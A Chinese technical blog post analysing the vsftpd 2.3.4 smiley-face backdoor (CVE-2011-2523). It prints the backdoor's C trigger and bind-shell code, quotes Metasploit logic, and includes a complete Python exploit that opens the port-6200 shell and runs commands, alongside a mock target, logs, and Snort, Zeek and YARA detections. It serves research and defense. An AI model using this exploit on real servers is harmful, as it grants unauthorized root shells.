---
title: "vsftpd 2.3.4「笑脸后门」全解：一行 :) 换一个 root shell"
date: 2026-11-11 22:41:52 +0800
course: 网络安全
kind: 技术博客
tags: [vsftpd, CVE-2011-2523, 供应链安全, 漏洞复现]
summary: 梳理 vsftpd 2.3.4 笑脸后门的事件背景与源码逻辑，记录 PoC 设计、Windows 行为复刻验证及检测防御思路。
---

> **一句话**：2011 年 6 月 30 日到 7 月 1 日之间，vsftpd 官方下载站上的 `vsftpd-2.3.4.tar.gz` 被人换成了植入后门的版本。谁的服务器用这个包编译安装，谁就有一条**免认证、以 root 运行、监听 6200 端口**的 shell 通道；触发它的全部条件，是 FTP 用户名里带一个笑脸 `:)`。
>
> 本文做三件事：拆开后门的两处源码改动、给出可复现的检测/利用 PoC（三阶段、带 marker 断言）、以及在**没有 Linux 容器**的 Windows 机器上如何用行为复刻靶机完成验证。

| 项 | 值 |
|---|---|
| 编号 | CVE-2011-2523（OSVDB-73573） |
| 类型 | 供应链投毒 / 内置后门（CWE-506 Embedded Malicious Code） |
| 载体 | `vsftpd-2.3.4.tar.gz`（2011-06-30 ~ 2011-07-01 期间从官方 master 站下载的那份） |
| 触发 | FTP `USER` 字段包含 `:)`（字节 `0x3a 0x29`）后登录 |
| 结果 | 目标 `bind()` 并 `listen()` 6200/TCP，`accept()` 后 `exec /bin/sh`，权限为 vsftpd 进程权限（root） |
| 利用工具 | Metasploit `exploit/unix/ftp/vsftpd_234_backdoor`（exploit-db 17491，作者 hdm / MC） |
| 披露 | 2011-07-03；后门由 Mathias Kresin 发现 |
| 关键特性 | 监听**一次性**：`accept` 一次就把自己 `exec` 成 shell，进程内不再有第二个监听循环 |

---

## 1. 事件：这不是"漏洞"，是一次投毒

绝大多数人第一次见它，是在 Metasploitable 2 靶机上——`nmap -sV` 报 `vsftpd 2.3.4`，然后 `use exploit/unix/ftp/vsftpd_234_backdoor` 一条命令进 root。但它的成因和普通 CVE 不一样：**源码里本来就有一扇门，是攻击者放进去的**。

时间线（据 Metasploit 模块描述与公开记录整理）：

| 时间 | 事件 |
|---|---|
| 2011-06-30 ~ 2011-07-01 | 攻击者取得 vsftpd 官方下载站（master 站点）的源码包分发权，把干净的 `vsftpd-2.3.4.tar.gz` 替换成植入了后门的版本 |
| 2011-07-01 起 | 下载并编译该包的用户，装上去的 vsftpd 自带一条 6200 端口后门通道 |
| 2011-07-03 | 后门被发现并移除；CVE-2011-2523 披露，"笑脸后门"由此得名 |

三条值得记住的教训：

1. **"官方站点"不等于"可信源"**。这次攻击没有碰任何一行 vsftpd 的 Git 历史里的"官方代码"，改的是**分发物**——tar.gz 这个二进制/源码交付层。它躲过了代码审查，因为被审的代码和发出去的包不是同一份。
2. **后门比漏洞更难"修"**。打补丁的语义是"修复某个函数写错了"；这里的语义是"你把一个恶意程序装到了机器上"。所以处置动作不是升级库，而是**重装 + 按入侵事件排查**。
3. **它的触发成本极低**：不需要口令、不需要漏洞利用技巧、不需要交互式溢出。`USER 任意字符:)` + 任意 `PASS` 即可。

---

## 2. 为什么是"笑脸"

vsftpd 登录流程里，`postlogin.c` 会处理用户名。后门版本在原逻辑旁边插了一段判断：扫描用户名缓冲区，一旦遇到字节 `0x3a`（`:`）紧跟 `0x29`（`)`），就调用一个上游根本不存在的函数 `vsf_sysutil_extra()`。

```c
/* postlogin.c —— 后门版本中被插入的判断（公开 diff 摘录） */
for (i = 0; i < p_sess->user_str_len; i++)
{
    if (p_str->p_buf[i] == 0x3a && p_str->p_buf[i+1] == 0x29)
    {
        vsf_sysutil_extra();
    }
}
```

`0x3a 0x29` 就是 `:)`。选它做触发器很"聪明"：正常的 FTP 用户名几乎不可能带这两个字符组合，所以后门不会误触发；而攻击者只要构造一个用户名，就能隔着一个 TCP 会话把 shell 打开。

---

## 3. 后门到底做了什么：`vsf_sysutil_extra()`

这个函数被追加在 `sysdeputil.c` 里（公开 diff 中位于该文件第 75–96 行附近），逻辑是**把一段完整的 bind shell 硬编码进服务进程**：

```c
/* sysdeputil.c —— 后门新增的 vsf_sysutil_extra()，等价结构 */
int fd, rfd;
struct sockaddr_in sa;

if ((fd = socket(AF_INET, SOCK_STREAM, 0)) < 0)
    return 0;

sa.sin_family      = AF_INET;
sa.sin_port        = htons(6200);        /* 后门端口写死 6200 */
sa.sin_addr.s_addr = INADDR_ANY;         /* 监听 0.0.0.0 */

bind(fd, (struct sockaddr *)&sa, sizeof(sa));
listen(fd, 128);

for (;;) {
    rfd = accept(fd, NULL, NULL);        /* 只 accept 一次就把自己替换掉 */
    dup2(rfd, 0); dup2(rfd, 1); dup2(rfd, 2);
    execl("/bin/sh", "sh", (char *)0);
}
```

四个技术要点，决定了它"怎么被打"和"怎么被检测"：

1. **端口写死 6200、地址 `INADDR_ANY`**：不需要配置，装好就在。任何能连 6200 的人都能连，不做来源限制。
2. **`accept` 一次性语义**：`for(;;)` 看着像循环，但 `execl` 之后**当前进程已经被 `/bin/sh` 替换**，监听 socket 随进程镜像一起消失。所以一次触发只换来一次 shell；想再要，必须重新发一遍 `USER xx:)`。
   > 这一条是实操里最容易踩的坑——很多人触发后用 `nc` 探一下 6200"通不通"，探测连接就把这次机会消费掉了，再连就 `Connection refused`，于是误判"没打成功"。
3. **权限是 vsftpd 进程权限**：后门在登录后的会话上下文里执行，而 vsftpd 主进程以 root 启动，因此拿到的 `/bin/sh` 是 root。Metasploit 模块里 `'Privileged' => true` 就是在描述这件事。
4. **不校验口令**：`USER 随便:)` 之后 `PASS 随便` 一样返回 `230`，后门照样打开——认证在这里完全失效。

### 3.1 Metasploit 模块的行为，可以当成"正确利用姿势"的参考实现

`exploit/unix/ftp/vsftpd_234_backdoor` 的 `exploit` 方法做了三件很讲究的事，值得抄进自己的 PoC：

```ruby
# 1) 先试 6200：如果它已经开着，说明后门已被别人（或上一次）打开过
nsock = self.connect(false, { 'RPORT' => 6200 }) rescue nil
if nsock
  print_warning("The port used by the backdoor bind listener is already open. Trying...")
  begin
    handle_backdoor(nsock)
  rescue
    print_error("Someone has beat us to it, the backdoor is already in-use!")
    raise Msf::Exploit::Failed, "Backdoor already in-use"
  end
end

# 2) 连 FTP，先读 banner 再决定要不要下手
connect
banner = get_banner
ftp_user = "#{rand_text_alphanumeric(rand(6) + 1)}:)"   # 随机前缀 + 笑脸
sock.put("USER #{ftp_user}\r\n")
resp = sock.get_once(-1, 30).to_s
# 匿名-only 的配置下后门代码走不到，530 就是提前退出的信号
if resp =~ /^530 /
  print_error("This server is configured for anonymous only and the backdoor code cannot be reached")
  return
end
return unless resp =~ /^331 /

# 3) 触发 PASS，然后去连 6200，而不是在同一连接里找回应
sock.put("PASS #{ftp_pass}\r\n")
nsock = self.connect(false, { 'RPORT' => 6200 }) rescue nil
```

把这三段翻成检测规则，就是：**看 21 端口上有没有 `USER ...:)`，并且前后几秒内有没有到 6200 的新连接**。

---

## 4. 复现环境：为什么我复刻了一个靶机，而不是跑原二进制

理想复现是起一台 Linux（Docker/VirtualBox）装 `vsftpd-2.3.4`（后门版 tar.gz），然后 `nmap` + PoC 打过去。本次实验机（Windows 11）三条路都堵：

| 限制 | 实测结果 | 处理方式 |
|---|---|---|
| 无容器 | `docker version` 无输出（未安装/无守护进程） | 放弃 Docker |
| 无 WSL | `wsl -l -v` 无输出 | 放弃 WSL |
| 6200 端口被占 | `Get-NetTCPConnection -LocalPort 6200` → `Bound` + `Established`，持有者 `mihomo`（本机代理，PID 54288），直接 `bind()` 报 `WinError 10013` | 复刻机 shell 端口改用 **16200**；PoC 默认仍是 6200，用 `--shell-port` 指定 |
| 无 `nc` | 无 netcat，`curl` / `nmap.exe` 可用 | PoC 全部用 Python 标准库 `socket` 手写，不依赖外部工具 |

另一层考虑是**样本本身**：后门版 tar.gz 属于"恶意源码包"，不是本该在实验机上编译运行的东西。写检测规则和 PoC 不需要真的把它跑起来——需要的是**行为契约**：FTP 21 端口响应 banner，`USER` 带 `:)` 后 `accept` 一次 6200。

于是做了一个**行为复刻靶机** `smiley_mock_server.py`：协议层与真实后门一致（`220 (vsFTPd 2.3.4)`、`USER/PASS` 流程、`:)` 触发、一次性监听），差异如下表——这也是本文所有"实测"结论的边界：

| 维度 | 真实后门（vsftpd-2.3.4 后门版） | 本文复刻靶机 |
|---|---|---|
| 运行平台 | Linux / `/bin/sh` | Windows / `cmd.exe`（`subprocess.run(cmd, shell=True)`） |
| shell 数量 | 一次性（`exec` 替换进程） | 一次性（`accept` 后 `srv.close()`，不再 listen）✅ 语义一致 |
| 监听地址 | `0.0.0.0:6200` | `127.0.0.1`（仅本地，避免暴露） |
| 端口 | 6200（写死） | 16200（本机 6200 被占，`SMILEY_SHELL_PORT` 可改） |
| 权限 | root | 当前用户 `wo2025` |
| 触发条件 | 用户名含 `0x3a 0x29` | 用户名含 `:)` ✅ 一致 |

---

## 5. PoC 设计：为什么拆成 scan / probe / verify 三段

单函数 PoC 有两个典型毛病：一是"探测"和"利用"混在一起，二是一次连接探 6200 就把机会打没了（见 §3 第 2 点）。所以拆三段，各自有独立判据：

| 阶段 | 发什么 | 判据 | 副作用 |
|---|---|---|---|
| `scan` | 只读 banner | `220[- ]...vsFTPd 2.3.4` 正则命中 | 无（不发 `USER`） |
| `probe` | `USER x:)` + `PASS 任意` | FTP 侧 `230`（并排除 `530` 匿名-only 情况） | 会触发后门监听，但**不连** 6200，把 shell 机会留给 verify |
| `verify` | 同上 + **一次**连接 shell 端口 | 回显里出现 `SMILEY-POC-OK`（marker 断言） | 消费掉这次 shell |

两个设计决定值得说明：

- **`probe` 不连 6200**：只证明"服务端接受了带 `:)` 的登录"，把"是否真的起了 shell"交给 `verify` 一次性验证。这既复刻了真实后门的 accept-once 语义，也让"探测"这一步变成可重复的。
- **`verify` 用 marker 而不是"端口通不通"**：端口能连上只说明有个 socket 在 listen，可能是蜜罐、是别人的 shell、也可能是被中间设备接管的假服务。只有**命令回显**才是后门可用的证据。

---

## 6. PoC 全文（`smiley_poc.py`，纯标准库，221 行）

```python
# -*- coding: utf-8 -*-
"""
smiley_poc.py —— vsftpd 2.3.4 笑脸后门（CVE-2011-2523）检测/利用 PoC（纯标准库）

三个阶段，可单独跑：
  scan    banner 指纹：读 "220 (vsFTPd 2.3.4)"，只判定「可能是易感版本」
  probe   触发 + 观察：USER x:)，PASS 任意，随后探测 6200 是否有 shell
  verify  在 probe 之上发一条带 marker 的命令，按回显断言后门真实可用

用法：
  py smiley_poc.py scan   127.0.0.1 --ftp-port 2121
  py smiley_poc.py probe  127.0.0.1 --ftp-port 2121
  py smiley_poc.py verify 127.0.0.1 --ftp-port 2121 --shell-port 6200
  py smiley_poc.py verify 127.0.0.1 --mock          # 打本机复刻靶机
"""
import sys, os, re, json, time, socket, argparse, datetime

sys.stdout.reconfigure(encoding="utf-8", errors="replace")

MARKER = "SMILEY-POC-OK"
OUT = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "evidence")
BANNER_RE = re.compile(rb"220[- ].*vsFTPd\s+2\.3\.4", re.I)


class Conn:
    def __init__(self, host, port, timeout=6.0):
        self.s = socket.create_connection((host, port), timeout=timeout)
        self.s.settimeout(timeout)
        self.buf = b""
        self.transcript = []

    def recv_until(self, token=b"\r\n", limit=8192):
        while token not in self.buf:
            chunk = self.s.recv(limit)
            if not chunk:
                break
            self.buf += chunk
        if token in self.buf:
            line, self.buf = self.buf.split(token, 1)
        else:
            line, self.buf = self.buf, b""
        self.transcript.append(("<<", line.decode("utf-8", "replace")))
        return line

    def send(self, data):
        if isinstance(data, str):
            data = data.encode()
        self.transcript.append((">>", data.decode("utf-8", "replace").rstrip("\r\n")))
        self.s.sendall(data)

    def close(self):
        try:
            self.s.close()
        except OSError:
            pass


def scan(host, port, timeout=6.0, verbose=True):
    """阶段 1：读 banner，只做版本指纹，不发任何触发字符。"""
    r = {"stage": "scan", "target": "%s:%d" % (host, port), "banner": None,
         "version_match": False, "transcript": []}
    try:
        c = Conn(host, port, timeout)
        line = c.recv_until()
        c.close()
        r["banner"] = line.decode("utf-8", "replace")
        r["version_match"] = bool(BANNER_RE.search(line))
        r["transcript"] = c.transcript
    except OSError as e:
        r["error"] = "%s: %s" % (type(e).__name__, e)
    if verbose:
        print("[scan] %-22s banner=%r match=%s" % (r["target"], r["banner"], r["version_match"]))
        if r.get("error"):
            print("[scan] error:", r["error"])
    return r


def probe(host, ftp_port, shell_port, timeout=6.0, wait=1.2, verbose=True,
          connect_shell=False):
    """阶段 2：发 USER smiley:) / PASS，观察 FTP 侧响应。

    注意：真实后门的 6200 监听是「一次性」的（accept 一次就 execve /bin/sh），
    任何探测性连接都会把这次 shell 机会消费掉。故默认不连 6200，只报告
    「FTP 已接受带 :) 的登录」；是否真的开了 shell 由 verify 阶段一次性验证。
    """
    r = {"stage": "probe", "target": "%s:%d" % (host, ftp_port), "shell_port": shell_port,
         "ftp_transcript": [], "shell_probed": False, "shell_open": None, "banner": None}
    c = None
    try:
        c = Conn(host, ftp_port, timeout)
        r["banner"] = c.recv_until().decode("utf-8", "replace")
        c.send("USER smiley:)\r\n"); c.recv_until()
        c.send("PASS trigger\r\n"); r["login_reply"] = c.recv_until().decode("utf-8", "replace")
        r["ftp_transcript"] = c.transcript
        r["login_ok"] = r["login_reply"].startswith("230")
    except OSError as e:
        r["error"] = "%s: %s" % (type(e).__name__, e)
    finally:
        if c:
            c.close()
    time.sleep(wait)  # 后门在登录成功后才 fork 监听，给它一点时间
    if connect_shell:
        r["shell_probed"] = True
        try:
            s = socket.create_connection((host, shell_port), timeout=timeout)
            s.settimeout(2.0)
            try:
                s.recv(64)
            except socket.timeout:
                pass
            r["shell_open"] = True
            s.close()
        except OSError as e:
            r["shell_open"] = False
            r["shell_error"] = "%s: %s" % (type(e).__name__, e)
    if verbose:
        print("[probe] ftp=%s login_ok=%s shell:%d probed=%s open=%s"
              % (r["target"], r.get("login_ok"), shell_port, r["shell_probed"], r["shell_open"]))
        for d, t in r["ftp_transcript"]:
            print("        %s %s" % (d, t))
    return r


def verify(host, ftp_port, shell_port, timeout=6.0, verbose=True):
    """阶段 3：触发 + 一次性连接 shell 端口 + 发 marker 命令，按回显判定后门可用。"""
    r = probe(host, ftp_port, shell_port, timeout, verbose=verbose, connect_shell=False)
    r["stage"] = "verify"
    r["marker"] = MARKER
    r["shell_commands"] = []
    r["shell_output"] = ""
    r["confirmed"] = False
    try:
        s = socket.create_connection((host, shell_port), timeout=timeout)
    except OSError as e:
        r["shell_error"] = "%s: %s" % (type(e).__name__, e)
        if verbose:
            print("[verify] shell 端口连不上 -> 未复现（非易感版本/后门未装/已被拦截）")
            print("[verify]", r["shell_error"])
        return r
    r["shell_open"] = True
    try:
        s.settimeout(4.0)
        try:
            s.recv(256)  # 吃掉可能的提示符（真实后门无 banner）
        except socket.timeout:
            pass
        for cmd in ["echo %s" % MARKER, "whoami"]:
            s.sendall((cmd + "\n").encode())
            r["shell_commands"].append(cmd)
            time.sleep(0.5)
        time.sleep(0.8)
        chunks = []
        while True:
            try:
                d = s.recv(4096)
            except socket.timeout:
                break
            if not d:
                break
            chunks.append(d)
            if len(b"".join(chunks)) > 8192:
                break
        r["shell_output"] = b"".join(chunks).decode("utf-8", "replace")
        r["confirmed"] = MARKER in r["shell_output"]
    except OSError as e:
        r["shell_error2"] = "%s: %s" % (type(e).__name__, e)
    finally:
        try:
            s.close()
        except OSError:
            pass
    if verbose:
        print("[verify] confirmed=%s" % r["confirmed"])
        print("[verify] shell 回显:")
        for ln in r["shell_output"].splitlines():
            print("        | " + ln)
    return r


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("stage", choices=["scan", "probe", "verify", "all"])
    ap.add_argument("host", nargs="?", default="127.0.0.1")
    ap.add_argument("--ftp-port", type=int, default=None)
    ap.add_argument("--shell-port", type=int, default=6200)
    ap.add_argument("--timeout", type=float, default=6.0)
    ap.add_argument("--mock", action="store_true", help="打本机复刻靶机（2121）")
    a = ap.parse_args()

    ftp_port = a.ftp_port or (2121 if a.mock else 21)
    res = {"ts": datetime.datetime.now().isoformat(timespec="seconds"),
           "host": a.host, "ftp_port": ftp_port, "shell_port": a.shell_port}

    if a.stage in ("scan", "all"):
        res["scan"] = scan(a.host, ftp_port, a.timeout)
    if a.stage in ("probe", "all"):
        res["probe"] = probe(a.host, ftp_port, a.shell_port, a.timeout)
    if a.stage in ("verify", "all"):
        res["verify"] = verify(a.host, ftp_port, a.shell_port, a.timeout)

    # 每个 stage 单独落盘，互不覆盖
    for k in ("scan", "probe", "verify"):
        if k in res:
            p = os.path.join(OUT, "smiley-%s.json" % k)
            os.makedirs(OUT, exist_ok=True)
            with open(p, "w", encoding="utf-8") as f:
                json.dump({k: res[k], "host": a.host, "ftp_port": ftp_port,
                           "shell_port": a.shell_port, "ts": res["ts"]},
                          f, ensure_ascii=False, indent=2)
            print("[+] 结果写盘:", os.path.normpath(p))

    v = res.get("verify")
    sys.exit(0 if (v and v["confirmed"]) else 1)


if __name__ == "__main__":
    main()
```

---

## 7. 复刻靶机的后门部分（`smiley_mock_server.py` 关键 60 行）

完整文件 153 行（含 FTP 命令分发、jsonl 事件日志）。核心只有两块：**登录成功后判断笑脸**、**一次性 bind shell**。

```python
BANNER = b"220 (vsFTPd 2.3.4)\r\n"
SHELL_PORT = int(os.environ.get("SMILEY_SHELL_PORT", "6200"))


def spawn_shell():
    """后门核心动作：在 shell 端口 bind 一个 shell 监听（只接受 1 次连接，模拟真实后门）。"""
    try:
        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind(("127.0.0.1", SHELL_PORT))
        srv.listen(1)
    except OSError as e:
        log("shell.bind_fail", port=SHELL_PORT, err=str(e))
        return
    log("shell.listen", port=SHELL_PORT)

    def waiter():
        try:
            c, a = srv.accept()
            log("shell.accept", addr="%s:%d" % a)
            shell_conn(c, a)          # 双向管道执行命令
        finally:
            srv.close()               # 一次性：accept 之后不再 listen
            log("shell.stop", port=SHELL_PORT)

    threading.Thread(target=waiter, daemon=True).start()


def handle(conn, addr):
    log("ftp.connect", addr="%s:%d" % addr)
    conn.sendall(BANNER)
    user, logged, f = "", False, conn.makefile("rb")
    while True:
        line = f.readline()
        if not line:
            break
        cmd = line.decode("utf-8", "replace").strip()
        log("ftp.cmd", cmd=cmd)
        verb = cmd.split(" ", 1)[0].upper()
        arg = cmd.split(" ", 1)[1] if " " in cmd else ""
        if verb == "USER":
            user = arg
            conn.sendall(b"331 Please specify the password.\r\n")
        elif verb == "PASS":
            logged = True
            conn.sendall(b"230 Login successful.\r\n")
            if ":)" in user:                       # ← 后门触发点
                log("trigger.smiley", user=user)
                spawn_shell()
        # ... SYST / FEAT / PWD / TYPE / QUIT 等最小应答
```

`shell_conn()` 把 `cmd` 交给 `subprocess.run(cmd, shell=True)`，把 stdout+stderr 回写给客户端，并逐条记录 `shell.cmd` 事件——这样"后门被触发过"在日志里有完整证据链，而不是靠一张嘴说。

---

## 8. 实测记录

环境：Windows 11 + Python 3.12；复刻靶机 `127.0.0.1:2121`（FTP）/ `16200`（shell）；负向对照 `127.0.0.1:2122`（pyftpdlib 正常 FTP）。

### 8.1 正向：打复刻靶机

```text
### 1) scan
[scan] 127.0.0.1:2121         banner='220 (vsFTPd 2.3.4)' match=True

### 2) probe（不连 shell，避免消费一次性机会）
[probe] ftp=127.0.0.1:2121 login_ok=True shell:16200 probed=False open=None
        << 220 (vsFTPd 2.3.4)
        >> USER smiley:)
        << 331 Please specify the password.
        >> PASS trigger
        << 230 Login successful.

### 3) verify（触发 + 连接 + marker 断言）
[verify] confirmed=True
[verify] shell 回显:
        | SMILEY-POC-OK
        |
        | # laptop-a0qf3dlp\wo2025
        |
        | #
```

`whoami` 回显 `laptop-a0qf3dlp\wo2025` 说明拿到的确实是**服务进程身份**的命令执行；换成真实后门，这一行在 Linux 上就是 `root`。注意 `PASS trigger`——口令是假的，`230` 照样返回，这就是"认证失效"的直接证据。

### 8.2 负向：打正常 FTP，必须判不出来

```text
### 4) scan
[scan] 127.0.0.1:2122         banner='220 pyftpdlib 2.2.0 normal FTP service ready.' match=False

### 5) probe
[probe] ftp=127.0.0.1:2122 login_ok=False shell:16200 probed=False open=None
        << 220 pyftpdlib 2.2.0 normal FTP service ready.
        >> USER smiley:)
        << 331 Username ok, send password.
        >> PASS trigger
        << 530 Authentication failed.
```

负向对照的价值常被低估：**只有"打不中正常服务"的检测器，才配被相信**。这里的两个判据都按预期 false——banner 不匹配、`:)` 触发后 `530` 而不是 `230`，也没有任何 16200 上的连接。

### 8.3 踩过的坑

| 现象 | 原因 | 正确做法 |
|---|---|---|
| `verify` 第一次跑 `confirmed=False`，连不上 16200 | 前一版 `probe` 会连 6200 测通断，把 mock 的一次性 `accept` 消费掉了 | `probe` 只读 FTP 响应；shell 只在 `verify` 里连一次（与真实后门语义一致） |
| mock 起不来，`bind` 报 `WinError 10013 ... 以一种访问权限不允许的方式做了一个访问套接字的尝试` | 6200/6201 被本机代理 `mihomo`（PID 54288）占用；且这两个端口会被 Windows 当作保留端口拒绝 | 换 `SMILEY_SHELL_PORT=16200`；真实后门端口不可改，只能换机器/容器复现 |
| `pyftpdlib` banner 变成 `220 220 pyftpdlib ...` | 库会自动补 `220`，笔者的 banner 字符串又写了一遍 | banner 只写正文，协议码交给库 |
| PowerShell 里 `Set-Content` 改 Python 源码后中文乱码 → `SyntaxError` | 用 `Get-Content -Raw ... \| Set-Content -Encoding UTF8` 覆写了 UTF-8 源文件 | 中文脚本一律整文件重写（或用编辑器），不要用文本替换批处理 |

---

## 9. 检测与防御

分四层，按"能不能在 10 分钟内落地"排序。

### 9.1 资产层：先把"装没装过"查清楚

```bash
# 1) 版本 + 包来源（发行版装的一般不是后门版，源码包编译的才是高危）
vsftpd -v
rpm -qi vsftpd 2>/dev/null || dpkg -l vsftpd
strings /usr/sbin/vsftpd | grep -E "6200|vsf_sysutil_extra"   # 命中即高度可疑

# 2) 文件完整性（有包管理就用包管理）
rpm -V vsftpd ; dpkg -V vsftpd

# 3) 源码包留档的就地检查
grep -Rn "0x3a" /usr/local/src/vsftpd-2.3.4/postlogin.c
grep -Rn "6200" /usr/local/src/vsftpd-2.3.4/
```

判据很硬：**正常 vsftpd 源码里不该出现 `6200` 这个字面量，也不该有 `vsf_sysutil_extra` 这个函数**。

### 9.2 网络层：两条规则就够抓现行

```text
# 入站：谁在连 6200（后门 shell 端口）
alert tcp any any -> $HOME_NET 6200 (msg:"LOCAL vsftpd 2.3.4 backdoor shell port 6200 inbound"; flags:S; sid:1000001; rev:1;)

# FTP 触发：USER 里带笑脸
alert tcp any any -> $HOME_NET 21 (msg:"LOCAL vsftpd 2.3.4 backdoor trigger USER smiley"; flow:to_server,established; content:"USER "; nocase; content:" :)" ; distance:1; within:64; sid:1000002; rev:1;)

# 出站：本机主动连外部 6200（被反打的迹象）
alert tcp $HOME_NET any -> any 6200 (msg:"LOCAL outbound to tcp/6200 (vsftpd backdoor pattern)"; flags:S; sid:1000003; rev:1;)
```

Zeek 侧同理，一句话就够：`event ftp_request(c: connection, command: string, arg: string) { if (command == "USER" && /\x3a\x29/ in arg) NOTICE(...); }`。

> 注意 `content:" :)"` 前后的空格与大小写：真实攻击工具（含 Metasploit）里用户名是 `随机串:)`，所以匹配要落在 `:)` 本身而不是整串。

### 9.3 主机层：可疑二进制/源码的 YARA

```yara
rule vsftpd_234_smiley_backdoor
{
    meta:
        description = "vsftpd 2.3.4 backdoor (CVE-2011-2523): smiley trigger + bind shell on 6200"
        reference   = "https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/unix/ftp/vsftpd_234_backdoor.rb"
    strings:
        $sym  = "vsf_sysutil_extra" ascii          // 上游不存在的函数名
        $smiley = { 3A 29 }                        // ":)"
        $port = { 38 18 }                          // 6200 的 htons 小端字节序
        $sh   = "/bin/sh" ascii
    condition:
        $sym or ($smiley and $port and $sh) or (uint16(0) == 0x457f and $port and $sh)
}
```

对 `vsftpd` 二进制跑一次，比对着版本号猜靠谱得多：**版本号是 ASCII，后门是代码**。

### 9.4 修复与处置

| 优先级 | 动作 |
|---|---|
| P0 | 凡是从源码包编译的 `vsftpd 2.3.4`：**按已失陷处置**——隔离主机、取证（`ps`、`ss -tanp`、`last`、`/root/.bash_history`、6200 连接记录）、重装系统或至少重装干净的 vsftpd 2.3.5+ |
| P0 | 防火墙两侧封禁 6200/tcp；`ss -tanlp \| grep 6200` 有监听即为铁证 |
| P1 | 改用发行版仓库的 vsftpd（有签名与校验），源码编译必须核对上游哈希/签名 |
| P1 | FTP 全面换成 SFTP/FTPS；至少要 `anonymous_enable=NO`（Metasploit 里 `530` 那条分支说的就是它） |
| P2 | 监控 21 端口上的 `USER ...:)`，把它当成"有人正在打你"而不是误报 |

---

## 10. 复盘：真正被打穿的不是版本号

这次实验里最有价值的三件事，都不是"怎么打"：

1. **供应链的攻击面在"分发物"里**。攻击者没改 Git，改的是 tar.gz。今天等价的位置是 npm/PyPI 包、CI 产物、Docker 镜像 tag、Homebrew formula —— 校验对象必须是**产物**（哈希/签名/attestation），不是仓库里的源码。
2. **后门的检测点在行为，不在版本**。`nmap -sV` 告诉你"可能是 2.3.4"，但真正判定的是：6200 有没有被 `bind`、`USER` 里有没有 `:)`、`accept` 之后有没有 `exec /bin/sh`。前两个是网络层数得出来的，第三个是 `strings`/YARA 数得出来的。
3. **PoC 的工程价值 > PoC 的破坏力**。scan/probe/verify 三段、marker 断言、负向对照、一次性语义——这四件东西加起来，才让"我打穿了"这句话在报告里站得住。只截图一张 `id`，说明不了一次性语义，也说明不了误报率。

---

## 11. 参考

- Metasploit 模块源码：<https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/unix/ftp/vsftpd_234_backdoor.rb>
- exploit-db 17491：<https://www.exploit-db.com/exploits/17491>
- 逆向视角与源码片段（含 `vsf_sysutil_extra` 解析）：<https://hackingtutorials.org/metasploit-tutorials/exploiting-vsftpd-metasploitable>
- CVE-2011-2523 记录：<https://vuldb.com/vuln/146452>
- OSVDB-73573 归档说明（发现者 Mathias Kresin）：<https://github.com/0x48piraj/PwnHouse/blob/master/OSVDB-73573/README.md>

---

*本文的 PoC、复刻靶机与实测记录均在本地授权环境（`127.0.0.1`）完成；实测输出原文见 `evidence/smiley-poc-transcript.txt`，结构化结果见 `evidence/smiley-{scan,probe,verify}.json`，复刻机事件日志见 `evidence/smiley-mock.log.jsonl`。*
